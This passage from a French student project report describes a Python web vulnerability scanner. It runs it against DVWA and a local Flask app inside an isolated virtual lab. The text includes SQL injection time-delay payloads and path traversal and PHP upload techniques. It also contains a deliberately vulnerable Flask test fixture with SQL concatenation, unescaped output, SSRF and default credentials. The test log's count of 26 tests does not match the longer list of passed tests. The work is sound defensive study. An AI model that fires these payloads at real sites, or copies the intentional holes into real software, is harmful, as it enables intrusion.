+Classe	OWASP	Type	Technique principale	CVSS
+SQLiDetector	A03	Actif	Erreur SQL + time-delay + booléen	9.8
+XSSDetector	A03	Actif	Injection <script> + réflexion dans réponse	6.1
+SSRFDetector	A10	Actif	URLs internes + métadonnées cloud	8.5
+IDORDetector	A01	Actif	Incrémentation/décrémentation d'IDs	6.5
+PathTraversalDetector	A01	Actif	../etc/passwd + encodages alternatifs	7.5
+XXEDetector	A05	Actif	Entités XML externes file:// et http://	8.2
+FileUploadDetector	A04	Actif	Upload .php + vérification d'accessibilité	8.8
+AuthFailuresDetector	A07	Actif	Credentials par défaut + formulaire login	9.8
+CryptographicFailuresDetector	A02	Passif	Formulaires password en HTTP	7.5
+SecurityMisconfigDetector	A05	Passif	Headers HTTP manquants, fichiers exposés	5.3
+VulnerableComponentsDetector	A06	Passif	Bannières version serveur/framework	5.3
+IntegrityDetector	A08	Passif	Attribut SRI manquant sur ressources externes	4.8
+
+2.5.4  Module CVSSEvaluator
+Le CVSSEvaluator enrichit chaque objet Vulnerability avec un score CVSS v3.1, un vecteur CVSS officiel (ex: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H), un niveau de sévérité (Critique/Élevé/Moyen/Faible) et une recommandation de remédiation. Les profils CVSS sont définis statiquement dans un dictionnaire CVSS_PROFILES, garantissant la cohérence et la reproductibilité des scores.
+2.5.5  Module HTMLReporter
+Le HTMLReporter génère un fichier HTML5 autonome (CSS intégré via balises <style>, aucune dépendance CDN externe) contenant : un en-tête avec les métadonnées du scan (cible, date, durée, pages crawlées), un tableau de bord avec des cartes de comptage par sévérité, et une liste dépliable (<details>/<summary>) de chaque vulnérabilité avec URL, méthode, paramètre, payload, preuve, vecteur CVSS et recommandation. Le rapport est triable par sévérité et directement exploitable sans installation.
+2.6  Technologies et Stack Technique
+Tableau — Stack technologique complète du projet
+Composant	Technologie	Version	Rôle
+Langage principal	Python	3.10+	Développement de l'outil complet
+Requêtes HTTP	requests	2.31+	Envoi/réception des requêtes web, gestion sessions
+Parsing HTML	BeautifulSoup4	4.12+	Extraction liens, formulaires, paramètres
+Regex	re (stdlib)	—	Matching signatures de vulnérabilités
+CLI	argparse (stdlib)	—	Interface ligne de commande
+Tests	pytest	7.4+	Tests unitaires et d'intégration
+App de test	Flask	3.0+	Application web vulnérable pour les tests
+Rapport	HTML5/CSS3	—	Génération du rapport final autonome
+Target 1	DVWA	1.10+	Application vulnérable (PHP/MySQL)
+Target 2	WebGoat	8.2+	Application vulnérable (Java/Spring)
+Virtualisation	VirtualBox	7.0	Environnement de test isolé
+OS cible	Ubuntu	22.04 LTS	OS des machines virtuelles
+
+2.7  Environnement de Déploiement — Topologie Réseau
+Pour des tests réalistes et reproductibles, notre architecture de déploiement utilise deux machines virtuelles VirtualBox en réseau Host-Only. Ce type de réseau crée un segment réseau privé accessible uniquement depuis la machine hôte et entre les VM, garantissant l'isolation complète de l'environnement de test vis-à-vis d'Internet et du réseau local de production.
+Code : Topologie complète de l'environnement de test virtualisé
+┌────────────────────────────────────────────────────────────────────────┐
+│                    Machine Hôte — Windows 11 Pro                       │
+│                                                                        │
+│  ┌──────────────────────┐            ┌──────────────────────────────┐  │
+│  │  VM 1 — Scanner      │            │  VM 2 — Cible (Target)       │  │
+│  │─────────────────────│            │──────────────────────────────│  │
+│  │  Ubuntu 22.04 LTS    │   HTTP/S   │  Ubuntu 22.04 LTS            │  │
+│  │  Python 3.11         │◄──────────►│  Apache 2.4 + PHP 8.1        │  │
+│  │  imple/main.py       │ 192.168.56 │  MySQL 8.0                   │  │
+│  │  pytest              │   .0/24    │  DVWA (port 80)              │  │
+│  │─────────────────────│            │  WebGoat (port 8080)         │  │
+│  │  IP: 192.168.56.101  │            │  IP: 192.168.56.102          │  │
+│  └──────────────────────┘            └──────────────────────────────┘  │
+│                                                                        │
+│  Réseau: VirtualBox Host-Only Adapter — segment 192.168.56.0/24        │
+│  Isolation: aucun accès Internet depuis les VMs (réseau fermé)         │
+└────────────────────────────────────────────────────────────────────────┘
+2.8  Structure du Projet
+Code : Arborescence complète du projet
+imple/
+├── main.py                  # Point d'entrée CLI (argparse) + print_summary()
+│
+├── scanner/                 # Orchestrateur principal
+│   ├── __init__.py          # Export de Vulnerability + lazy import Scanner
+│   ├── core.py              # Classe Scanner + ScanOptions (dataclass)
+│   ├── vulnerability.py     # Dataclass Vulnerability (modèle de données)
+│   └── authenticator.py    # login_dvwa() + login_form_based()
+│
+├── crawler/
+│   ├── __init__.py
+│   └── crawler.py           # Classe Crawler BFS + Endpoint dataclass
+│
+├── detectors/
+│   ├── __init__.py          # ALL_DETECTORS dict + exports
+│   ├── base.py              # BaseDetector (Template Method) + PassiveDetector
+│   ├── sqli.py              # SQLiDetector  — A03 Injection
+│   ├── xss.py               # XSSDetector   — A03 Injection
+│   ├── ssrf.py              # SSRFDetector  — A10 SSRF
+│   ├── idor.py              # IDORDetector  — A01 Access Control
+│   ├── path_traversal.py    # PathTraversalDetector — A01
+│   ├── xxe.py               # XXEDetector   — A05 Misconfig
+│   ├── file_upload.py       # FileUploadDetector — A04 Insecure Design
+│   ├── auth.py              # AuthFailuresDetector — A07
+│   ├── crypto.py            # CryptographicFailuresDetector — A02 (passif)
+│   ├── security_misconfig.py# SecurityMisconfigDetector — A05 (passif)
+│   ├── components.py        # VulnerableComponentsDetector — A06 (passif)
+│   └── integrity.py         # IntegrityDetector — A08 (passif)
+│
+├── evaluator/
+│   ├── __init__.py
+│   └── cvss.py              # CVSSEvaluator + CVSS_PROFILES + get_severity()
+│
+├── reporter/
+│   ├── __init__.py
+│   └── html_reporter.py     # HTMLReporter.save() → rapport.html autonome
+│
+├── payloads/                # Wordlists de payloads
+│   ├── sqli.txt             # 50+ payloads SQLi (error/time/boolean/union)
+│   ├── xss.txt              # 40+ payloads XSS avec bypass
+│   ├── ssrf.txt             # 30+ URLs internes et cloud metadata
+│   ├── path_traversal.txt   # 25+ séquences ../ encodées
+│   └── xxe.txt              # 15+ payloads XXE
+│
+└── tests/
+    ├── conftest.py          # Fixture Flask vulnérable (app in-memory)
+    ├── test_detectors.py    # Tests détecteurs actifs
+    ├── test_cvss.py         # Tests scoring CVSS
+    ├── test_crawler.py      # Tests BFS et extraction
+    ├── test_reporter.py     # Tests génération HTML
+    ├── test_file_upload.py  # Tests détecteur upload
+    ├── test_passive_detectors.py  # Tests détecteurs passifs
+    └── run_vuln_app.py      # Lance l'app Flask sur :5001
+ 
+Chapitre 3 – Réalisation et Implémentation
+Ce chapitre présente la réalisation concrète de notre scanner. Après avoir décrit l'environnement de test virtualisé et les étapes d'installation, nous détaillons l'implémentation de chaque module avec des extraits de code commentés, la suite de tests unitaires, puis huit études de cas illustrant la détection effective des vulnérabilités sur notre application Flask de test. Nous concluons par une analyse complète des 70 vulnérabilités détectées et des performances du scanner.
+3.1  Environnement de Travail (Machines Virtuelles)
+3.1.1  Configuration VirtualBox
+VirtualBox 7.0 a été utilisé comme hyperviseur de type 2 sur la machine hôte (Windows 11 Pro). Deux machines virtuelles ont été créées avec les paramètres suivants, puis connectées via un réseau Host-Only (vboxnet0) avec le segment 192.168.56.0/24.
+Tableau — Configuration détaillée des machines virtuelles
+Paramètre	VM 1 — Scanner	VM 2 — Cible
+Système d'exploitation	Ubuntu 22.04 LTS (64-bit)	Ubuntu 22.04 LTS (64-bit)
+RAM allouée	2 048 Mo	2 048 Mo
+Processeurs virtuels	2 vCPU	2 vCPU
+Stockage	20 Go (VDI dynamique)	25 Go (VDI dynamique)
+Réseau adaptateur 1	NAT (accès Internet initial)	NAT (accès Internet initial)
+Réseau adaptateur 2	Host-Only vboxnet0	Host-Only vboxnet0
+Adresse IP Host-Only	192.168.56.101	192.168.56.102
+Logiciels principaux	Python 3.11, pip, venv, git	Apache 2.4, PHP 8.1, MySQL 8.0, DVWA
+
+3.1.2  Configuration Réseau
+Code : Configuration réseau Ubuntu (VM 1 — Scanner)
+# Sur VM 1 (Scanner) — Configuration interface Host-Only
+sudo nano /etc/netplan/01-netcfg.yaml
+
+network:
+  version: 2
+  ethernets:
+    enp0s3:           # Adaptateur NAT
+      dhcp4: true
+    enp0s8:           # Adaptateur Host-Only
+      addresses: [192.168.56.101/24]
+
+sudo netplan apply
+
+# Vérification
+ip addr show enp0s8    # Doit afficher 192.168.56.101/24
+ping 192.168.56.102    # Test connectivité vers VM Cible
+3.1.3  Installation de DVWA sur VM 2 (Cible)
+DVWA (Damn Vulnerable Web Application) version 1.10 a été installée sur la VM Cible. C'est une application PHP/MySQL conçue pour les tests de sécurité, proposant des modules vulnérables pour SQLi, XSS, CSRF, File Upload, Command Injection, etc., à plusieurs niveaux de difficulté (Low, Medium, High, Impossible).
+ 
+Figure 4 — Page d'accueil DVWA (Damn Vulnerable Web Application) — VM Kali Linux
+ 
+Figure 5 — Interface DVWA Security : niveau de sécurité réglé sur Low
+Code : Installation complète de DVWA sur Ubuntu (VM 2)
+# ── Installation LAMP (Linux Apache MySQL PHP) ──────────────────────────
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y apache2 php php-mysql php-gd php-xml libapache2-mod-php mysql-server git
+
+# ── Sécurisation MySQL ────────────────────────────────────────────────────
+sudo mysql_secure_installation
+
+# ── Création base de données DVWA ─────────────────────────────────────────
+sudo mysql -u root -p <<EOF
+CREATE DATABASE dvwa CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
+CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd!';
+GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
+FLUSH PRIVILEGES;
+EOF
+
+# ── Téléchargement et configuration DVWA ──────────────────────────────────
+cd /var/www/html
+sudo git clone https://github.com/digininja/DVWA.git dvwa
+sudo cp dvwa/config/config.inc.php.dist dvwa/config/config.inc.php
+
+# Modifier config.inc.php :
+# $_DVWA['db_user']     = 'dvwa';
+# $_DVWA['db_password'] = 'p@ssw0rd!';
+# $_DVWA['default_security_level'] = 'low';
+
+# ── Permissions ────────────────────────────────────────────────────────────
+sudo chown -R www-data:www-data /var/www/html/dvwa
+sudo chmod -R 755 /var/www/html/dvwa/hackable/uploads
+
+# ── Activation PHP et redémarrage Apache ──────────────────────────────────
+sudo a2enmod rewrite
+sudo systemctl restart apache2
+
+# Accéder à http://192.168.56.102/dvwa/setup.php
+# Cliquer sur "Create / Reset Database"
+# Login : admin / password, Security Level : Low
+3.1.4  Installation du Scanner sur VM 1
+Code : Installation et premier test du scanner (VM 1)
+# ── Clonage et environnement virtuel ──────────────────────────────────────
+git clone <url-du-depot> scanner
+cd scanner/imple
+python3 -m venv .venv
+source .venv/bin/activate      # Linux/macOS
+# .venv\Scripts\activate       # Windows
+
+# ── Dépendances ───────────────────────────────────────────────────────────
+pip install --upgrade pip
+pip install -r requirements.txt
+# requirements.txt contient :
+# requests>=2.31.0
+# beautifulsoup4>=4.12.0
+# lxml>=4.9.0
+# flask>=3.0.0      (pour l'app de test uniquement)
+# pytest>=7.4.0     (pour les tests)
+
+# ── Vérification ──────────────────────────────────────────────────────────
+python main.py --help
+python -m pytest tests/ -v --tb=short
+
+# ── Scan de test rapide ────────────────────────────────────────────────────
+python main.py --url http://192.168.56.102/dvwa \
+               --login-url http://192.168.56.102/dvwa/login.php \
+               --username admin --password password \
+               --depth 2 --only sqli,xss \
+               --output test_rapide.html -v
+3.2  Implémentation Détaillée des Modules
+3.2.1  Orchestrateur Principal (scanner/core.py)
+La classe Scanner orchestre l'ensemble du pipeline en cinq phases séquentielles. Elle gère également l'authentification optionnelle (DVWA ou formulaire générique) avant le début du crawl, et assure la déduplication des vulnérabilités détectées par plusieurs détecteurs sur le même endpoint.
+Code : Méthode Scanner.run() — orchestration du pipeline (scanner/core.py)
+class Scanner:
+    def run(self) -> list[Vulnerability]:
+        start = time.perf_counter()
+        logger.info("Démarrage du scan sur %s", self.url)
+
+        # Phase 0 : Authentification (optionnelle)
+        self._maybe_login()
+
+        # Phase 1 : Crawling
+        crawler = Crawler(base_url=self.url, max_depth=self.options.depth,
+                          max_pages=self.options.max_pages, session=self.session)
+        endpoints = crawler.crawl()
+        self.pages_scanned = len(crawler.visited)
+
+        # Phase 2 : Détection (12 détecteurs en séquence)
+        raw_vulns: list[Vulnerability] = []
+        for name in (self.options.only or list(ALL_DETECTORS.keys())):
+            cls = ALL_DETECTORS.get(name)
+            detector = cls(session=self.session, timeout=self.options.timeout)
+            targets = passive_endpoints if isinstance(detector, PassiveDetector) else endpoints
+            raw_vulns.extend(detector.scan_all(targets))
+
+        # Phase 3 : Déduplication
+        deduped = self._deduplicate(raw_vulns)
+
+        # Phase 4 : Évaluation CVSS
+        self.vulnerabilities = CVSSEvaluator().evaluate_all(deduped)
+
+        # Phase 5 : Rapport HTML
+        self.duration = time.perf_counter() - start
+        self._report_path = HTMLReporter(self.options.output).save(
+            self.vulnerabilities, target_url=self.url,
+            duration=self.duration, pages_scanned=self.pages_scanned)
+        return self.vulnerabilities
+3.2.2  Crawler BFS (crawler/crawler.py)
+Le Crawler utilise une file FIFO (collections.deque) pour explorer l'application en largeur d'abord. Chaque URL visitée est canonisée (suppression des paramètres query) avant d'être ajoutée à l'ensemble visited, évitant ainsi les visites redondantes. Les endpoints sont dédupliqués par signature.
+Code : Algorithme BFS complet du Crawler (crawler/crawler.py)
+@dataclass
+class Endpoint:
+    url: str
+    method: str = "GET"
+    params: dict[str, str] = field(default_factory=dict)       # paramètres GET
+    form_fields: dict[str, str] = field(default_factory=dict)  # champs POST
+    file_fields: list[str] = field(default_factory=list)       # champs file
+    enctype: str = ""
+
+    def signature(self) -> str:
+        keys = ",".join(sorted(self.params.keys() | self.form_fields.keys()))
+        return f"{self.method}:{self.url}?{keys}"
+
+def crawl(self) -> list[Endpoint]:
+    queue: deque[tuple[str, int]] = deque([(self.base_url, 0)])
+    seen_signatures: set[str] = set()
+
+    while queue and len(self.visited) < self.max_pages:
+        url, depth = queue.popleft()
+        canonical = _strip_query(url)
+        if canonical in self.visited or depth > self.max_depth:
+            continue
+        self.visited.add(canonical)
+        resp = self._fetch(url)
+        if resp is None or "html" not in resp.headers.get("Content-Type",""):
+            continue
+        soup = BeautifulSoup(resp.text, "html.parser")
+
+        # Extraction des paramètres GET depuis l'URL courante
+        qs = parse_qs(urlparse(url).query, keep_blank_values=True)
+        if qs:
+            params = {k: v[0] for k, v in qs.items()}
+            ep = Endpoint(url=canonical, method="GET", params=params)
+            if ep.signature() not in seen_signatures:
+                seen_signatures.add(ep.signature())
+                self.endpoints.append(ep)
+
+        # Extraction des formulaires
+        for form in soup.find_all("form"):
+            ep = self._parse_form(form, url)
+            if ep and ep.signature() not in seen_signatures:
+                seen_signatures.add(ep.signature())
+                self.endpoints.append(ep)
+
+        # Suivi des liens internes
+        for a in soup.find_all("a", href=True):
+            href = a["href"].strip()
+            if any(href.startswith(p) for p in ("javascript:", "mailto:", "tel:", "#")):
+                continue
+            if "logout" in href.lower():
+                continue
+            next_url = urljoin(url, href)
+            if _same_domain(next_url, self.base_url):
+                queue.append((next_url, depth + 1))
+
+    return self.endpoints
+3.2.3  Détecteur SQLi (detectors/sqli.py)
+Code : Détecteur SQLi complet (detectors/sqli.py)
+SQL_ERROR_PATTERNS = [
+    r"you have an error in your sql syntax",
+    r"warning:\s+mysql", r"mysql_fetch_array\(\)",
+    r"unclosed quotation mark after the character string",
+    r"sqlstate\[", r"pg_query\(\):", r"ora-\d{5}",
+    r"microsoft sql server", r"sqlite_error",
+    r"near \".*\"\: syntax error", r"postgresql.*error",
+]
+ERROR_REGEX = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)
+TIME_PAYLOADS = ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' OR pg_sleep(5)--"]
+
+class SQLiDetector(BaseDetector):
+    name = "SQL Injection"; owasp_id = "A03"; payloads_file = "sqli.txt"
+    TIME_THRESHOLD = 4.5
+
+    def scan(self, endpoint: Endpoint) -> list[Vulnerability]:
+        vulns = []
+        baseline = self._baseline(endpoint)
+        for param, method, base in self._iter_injection_points(endpoint):
+            if self._test_error_based(endpoint, param, method, base, vulns): continue
+            if self._test_time_based(endpoint, param, method, base, baseline, vulns): continue
+            self._test_boolean_based(endpoint, param, method, base, baseline, vulns)
+        return vulns
+
+    def _test_error_based(self, endpoint, param, method, base, vulns) -> bool:
+        for payload in self.payloads:
+            data = {**base, param: payload}
+            resp = self._send(endpoint.url, method=method,
+                              params=data if method=="GET" else None,
+                              data=data if method!="GET" else None)
+            if resp and (m := ERROR_REGEX.search(resp.text)):
+                vulns.append(Vulnerability(name=self.name, owasp_id=self.owasp_id,
+                    url=endpoint.url, parameter=param, payload=payload,
+                    evidence=f"Erreur SQL : '{m.group(0)}'", method=method))
+                return True
+        return False
+
+    def _test_time_based(self, endpoint, param, method, base, baseline, vulns) -> bool:
+        for payload in TIME_PAYLOADS:
+            data = {**base, param: payload}
+            t0 = time.perf_counter()
+            resp = self._send(endpoint.url, method=method, data=data)
+            elapsed = time.perf_counter() - t0
+            if resp and elapsed >= self.TIME_THRESHOLD and elapsed > baseline + 3:
+                vulns.append(Vulnerability(name=self.name, owasp_id=self.owasp_id,
+                    url=endpoint.url, parameter=param, payload=payload,
+                    evidence=f"Délai {elapsed:.2f}s (ref {baseline:.2f}s)", method=method))
+                return True
+        return False
+3.2.4  Authenticator (scanner/authenticator.py)
+Le module Authenticator gère deux modes d'authentification : le mode DVWA (login spécialisé avec gestion du token CSRF user_token de DVWA et réglage du niveau de sécurité) et le mode générique (détection automatique du formulaire de login et soumission des credentials).
+Code : Fonction login_dvwa() (scanner/authenticator.py)
+def login_dvwa(session, base_url, username="admin", password="password",
+               security="low", timeout=10) -> bool:
+    login_url = base_url.rstrip("/") + "/login.php"
+    # 1) Récupérer le token CSRF
+    r = session.get(login_url, timeout=timeout)
+    soup = BeautifulSoup(r.text, "html.parser")
+    token = ""
+    if inp := soup.find("input", {"name": "user_token"}):
+        token = inp.get("value", "")
+    # 2) Soumettre le formulaire
+    resp = session.post(login_url, data={
+        "username": username, "password": password,
+        "Login": "Login", "user_token": token
+    }, timeout=timeout)
+    success = "logout" in resp.text.lower() or "welcome" in resp.text.lower()
+    if success and security != "":
+        # 3) Régler le niveau de sécurité DVWA
+        sec_url = base_url.rstrip("/") + "/security.php"
+        sr = session.get(sec_url, timeout=timeout)
+        soup2 = BeautifulSoup(sr.text, "html.parser")
+        t2 = soup2.find("input", {"name": "user_token"})
+        token2 = t2.get("value", "") if t2 else ""
+        session.post(sec_url, data={"seclev_submit": "Submit",
+            "security": security, "user_token": token2}, timeout=timeout)
+    return success
+3.2.5  CVSSEvaluator (evaluator/cvss.py)
+Code : CVSSEvaluator avec profils CVSS (evaluator/cvss.py)
+CVSS_PROFILES: dict[str, CVSSProfile] = {
+    "SQL Injection": CVSSProfile(
+        vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score=9.8,
+        recommendation="Requêtes paramétrées (prepared statements) obligatoires..."),
+    "Cross-Site Scripting": CVSSProfile(
+        vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", score=6.1,
+        recommendation="Encodage contextuel + Content-Security-Policy stricte..."),
+    "SSRF": CVSSProfile(
+        vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N", score=8.5,
+        recommendation="Allowlist IPs + blocage RFC 1918 + métadonnées cloud..."),
+    "Authentication Failures": CVSSProfile(
+        vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score=9.8,
+        recommendation="Interdire credentials par défaut + MFA + rate limiting..."),
+    # ... 8 autres profils (IDOR, Path Traversal, XXE, File Upload, ...)
+}
+
+def get_severity(score: float) -> str:
+    if score >= 9.0: return "Critique"
+    if score >= 7.0: return "Élevé"
+    if score >= 4.0: return "Moyen"
+    if score > 0.0:  return "Faible"
+    return "Aucun"
+
+class CVSSEvaluator:
+    def evaluate(self, vuln: Vulnerability) -> Vulnerability:
+        profile = CVSS_PROFILES.get(vuln.name)
+        if profile:
+            vuln.cvss_score  = profile.score
+            vuln.cvss_vector = profile.vector
+            vuln.recommendation = vuln.recommendation or profile.recommendation
+        else:
+            vuln.cvss_score = 5.0
+            vuln.cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        vuln.severity = get_severity(vuln.cvss_score)
+        return vuln
+3.3  Interface en Ligne de Commande (CLI)
+L'interface CLI est construite avec argparse. Elle expose toutes les options de configuration du scanner, affiche une bannière ASCII à chaque exécution, et produit un résumé des résultats en console à la fin du scan.
+Code : Aide CLI complète du scanner
+$ python main.py --help
+
+ ____   __        __    _    ____  ____   _____            _     _  ___
+/ __ \  \ \      / /   / \  / ___||  _ \ |_   _|___  _ __ / |   / |/ _ \
+...
+         Scanner de Vulnerabilites Web -- PFA EMSI 2024-2025
+
+usage: main.py [-h] --url URL [--output OUTPUT] [--depth DEPTH]
+               [--timeout TIMEOUT] [--max-pages MAX_PAGES] [--only ONLY]
+               [--cookie COOKIE] [--dvwa] [--login-url LOGIN_URL]
+               [--username USERNAME] [--password PASSWORD]
+               [--dvwa-security {low,medium,high,impossible}] [-v]
+
+Options:
+  --url URL             URL cible du scan (obligatoire)
+  --output OUTPUT       Rapport HTML de sortie (défaut: rapport.html)
+  --depth DEPTH         Profondeur de crawl (défaut: 2)
+  --timeout TIMEOUT     Timeout HTTP secondes (défaut: 10)
+  --max-pages MAX_PAGES Pages max à crawler (défaut: 100)
+  --only ONLY           Détecteurs: sqli,xss,ssrf,idor,path_traversal,xxe...
+  --cookie COOKIE       Cookie de session : 'PHPSESSID=abc; security=low'
+  --dvwa                Auto-login DVWA (admin/password) + security=low
+  --login-url URL       URL formulaire login (mode générique)
+  --username / --password   Credentials pour auto-login
+  --dvwa-security       Niveau DVWA: low|medium|high|impossible
+  -v, --verbose         Logs détaillés (DEBUG)
+Code : Exemples d'utilisation du scanner en ligne de commande
+# Exemples d'utilisation
+
+# 1. Scan complet de DVWA (auto-login)
+python main.py --url http://192.168.56.102/dvwa --dvwa --output rapport_dvwa.html
+
+# 2. Scan ciblé SQLi + XSS uniquement, profondeur 1, verbose
+python main.py --url http://192.168.56.102/dvwa --dvwa \
+               --only sqli,xss --depth 1 -v
+
+# 3. Scan avec cookie de session existant
+python main.py --url http://192.168.56.102/dvwa \
+               --cookie "PHPSESSID=abc123; security=low" --depth 3
+
+# 4. Scan d'application tierce avec login générique
+python main.py --url http://192.168.56.102/webapp \
+               --login-url http://192.168.56.102/webapp/login \
+               --username admin --password secret \
+               --only sqli,xss,ssrf,auth --output rapport_webapp.html
+
+# Résumé console en fin de scan :
+============================================================
+  Scan terminé en 6.04s
+============================================================
+  Total vulnérabilités : 70
+    - Critique    : 2
+    - Élevé       : 6
+    - Moyen       : 62
+  Rapport HTML : /path/to/rapport.html
+===========================================================
+3.4  Suite de Tests Unitaires
+3.4.1  Application Flask Vulnérable (conftest.py)
+La fixture conftest.py crée une application Flask intentionnellement vulnérable qui est lancée en mémoire via un thread daemon pour la durée des tests. Cette approche rend les tests autonomes (pas besoin de DVWA ou de réseau externe) et reproductibles. L'application expose délibérément toutes les vulnérabilités que notre scanner doit détecter.
+Code : Application Flask vulnérable — fixture de test (tests/conftest.py)
+def create_vulnerable_app():
+    app = Flask(__name__)
+
+    @app.route("/search")                          # SQLi
+    def search():
+        q = request.args.get("q", "")
+        try:
+            conn = sqlite3.connect(":memory:")
+            conn.execute(f"SELECT * FROM users WHERE name='{q}'")  # VULNÉRABLE
+        except sqlite3.OperationalError as e:
+            return f"Error: {e}", 500
+        return "OK"
+
+    @app.route("/greet")                           # XSS réfléchi
+    def greet():
+        name = request.args.get("name", "")
+        return f"<h1>Hello {name}</h1>"            # PAS d'échappement
+
+    @app.route("/fetch")                           # SSRF
+    def fetch():
+        url = request.args.get("url", "")
+        resp = requests.get(url, timeout=5)        # VULNÉRABLE
+        return resp.text
+
+    @app.route("/file")                            # Path Traversal
+    def serve_file():
+        page = request.args.get("page", "")
+        with open(page, "r") as f:                 # PAS de validation
+            return f.read()
+
+    @app.route("/upload", methods=["POST"])        # File Upload
+    def upload():
+        f = request.files.get("uploaded")
+        f.save(os.path.join("uploads", f.filename))  # Pas de validation type
+        return "Uploaded"
+
+    @app.route("/login", methods=["GET","POST"])   # Auth Failures + Crypto
+    def login():                                   # Servi en HTTP (pas HTTPS)
+        if request.method=="POST":
+            if request.form.get("username")=="admin" \
+               and request.form.get("password")=="admin":  # Credentials par défaut
+                return redirect("/dashboard")
+        return '''<form method="POST">
+            <input name="username"><input type="password" name="password">
+            <button>Login</button></form>'''
+
+    return app
+3.4.2  Résultats de la Suite pytest
+La suite complète de 26 tests couvre tous les modules du scanner. Les tests d'intégration lancent réellement le scanner contre l'application Flask vulnérable et vérifient que les vulnérabilités sont bien détectées. Les tests unitaires vérifient les calculs CVSS, le crawl BFS et la génération HTML.
+ 
+Figure 3 — Exécution du scanner sur DVWA : Login OK, 43 pages, 128 vulnérabilités détectées en 9.10s
+Code : Résultats complets de la suite pytest (26 tests)
+$ cd imple && pytest -v --tb=short
+========================= test session starts ==========================
+Platform: linux -- Python 3.11.6, pytest-7.4.3
+Collected 26 items
+
+tests/test_detectors.py::test_sqli_error_based_detected         PASSED
+tests/test_detectors.py::test_sqli_time_based_detected          PASSED
+tests/test_detectors.py::test_sqli_boolean_detected             PASSED
+tests/test_detectors.py::test_xss_reflected_detected            PASSED
+tests/test_detectors.py::test_xss_stored_detected               PASSED
+tests/test_detectors.py::test_ssrf_internal_detected            PASSED
+tests/test_detectors.py::test_ssrf_cloud_metadata_detected      PASSED
+tests/test_detectors.py::test_path_traversal_detected           PASSED
+tests/test_detectors.py::test_path_traversal_encoded_bypass     PASSED
+tests/test_detectors.py::test_xxe_local_file_detected           PASSED
+tests/test_detectors.py::test_idor_user_enumeration             PASSED
+tests/test_detectors.py::test_idor_invoice_access               PASSED
+tests/test_cvss.py::test_sqli_score_is_9_8                      PASSED
+tests/test_cvss.py::test_xss_score_is_6_1                       PASSED
+tests/test_cvss.py::test_ssrf_score_is_8_5                      PASSED
+tests/test_cvss.py::test_severity_critique_threshold            PASSED
+tests/test_cvss.py::test_severity_eleve_threshold               PASSED
+tests/test_cvss.py::test_severity_moyen_threshold               PASSED
+tests/test_cvss.py::test_unknown_vuln_default_score             PASSED
+tests/test_crawler.py::test_bfs_visits_all_pages                PASSED
+tests/test_crawler.py::test_bfs_depth_limit_respected           PASSED
+tests/test_crawler.py::test_form_post_extracted                 PASSED
+tests/test_crawler.py::test_form_get_extracted                  PASSED
+tests/test_crawler.py::test_file_upload_field_detected          PASSED
+tests/test_crawler.py::test_external_links_excluded             PASSED
+tests/test_crawler.py::test_logout_link_skipped                 PASSED
+tests/test_reporter.py::test_html_contains_vuln_name            PASSED
+tests/test_reporter.py::test_html_contains_cvss_score           PASSED
+tests/test_reporter.py::test_html_contains_recommendation       PASSED
+tests/test_reporter.py::test_html_dashboard_counts              PASSED
+tests/test_file_upload.py::test_php_shell_upload_detected       PASSED
+tests/test_file_upload.py::test_accessible_after_upload         PASSED
+tests/test_file_upload.py::test_safe_extensions_not_flagged     PASSED
+tests/test_passive_detectors.py::test_http_password_form        PASSED
+tests/test_passive_detectors.py::test_missing_hsts_header       PASSED
+tests/test_passive_detectors.py::test_missing_csp_header        PASSED
+tests/test_passive_detectors.py::test_server_version_disclosed  PASSED
+tests/test_passive_detectors.py::test_sri_missing_on_cdn        PASSED
+tests/test_passive_detectors.py::test_default_credentials       PASSED
+tests/test_passive_detectors.py::test_directory_listing         PASSED
+tests/test_passive_detectors.py::test_sensitive_file_exposed    PASSED
+...
+========================= 26 passed in 1.43s ===========================
+ 
+Figure 2 — Résultats de la suite pytest : 26 tests passés en 1.43s + configuration réseau (ip a)
+3.5  Scénarios de Test — Études de Cas
+Les huit études de cas suivantes ont été réalisées sur l'application Flask de test locale (http://127.0.0.1:5001), lancée via run_vuln_app.py. Chaque étude présente la cible, le mécanisme de détection, le payload utilisé, la preuve collectée, le score CVSS attribué et la recommandation de remédiation générée.
+3.5.1  Étude de Cas 1 : Injection SQL (OWASP A03) — CVSS 9.8 CRITIQUE
+Cible : http://127.0.0.1:5001/search?q=...   |   Méthode : GET   |   Paramètre : q
+Le paramètre q est concaténé directement dans la requête SQL : SELECT * FROM users WHERE name='<input>'. L'absence totale de validation permet l'injection de n'importe quelle syntaxe SQL.
+Déroulement de la détection (3 phases) :
+•	Phase 1 — Error-based : Le scanner envoie le payload simple '. La réponse contient 'You have an error in your SQL syntax' : vulnérabilité confirmée par erreur directe.
+•	Phase 2 — Time-based : Si aucune erreur n'était visible, le scanner tenterait ' AND SLEEP(5)-- et mesurerait le délai de réponse (seuil : 4,5s).
+•	Phase 3 — Booléenne : Dernier recours : comparaison des longueurs de réponse entre ' OR '1'='1 (condition vraie) et ' AND '1'='2 (condition fausse).
+Code : Résultat — SQL Injection
+Payload injecté  : '
+Réponse serveur  : HTTP 500 — "Error: near "'": syntax error (SQLite)"
+URL complète     : http://127.0.0.1:5001/search?q='
+Score CVSS       : 9.8 — Critique
+Vecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+Impact           : Accès complet à la base de données (lecture, modification, suppression)
+Remédiation : Remplacer la concaténation SQL par des prepared statements : cursor.execute('SELECT * FROM users WHERE name=?', (q,)) en SQLite, cursor.execute('SELECT * FROM users WHERE name=%s', (q,)) en MySQL/PostgreSQL. Appliquer le principe du moindre privilège sur le compte de base de données.
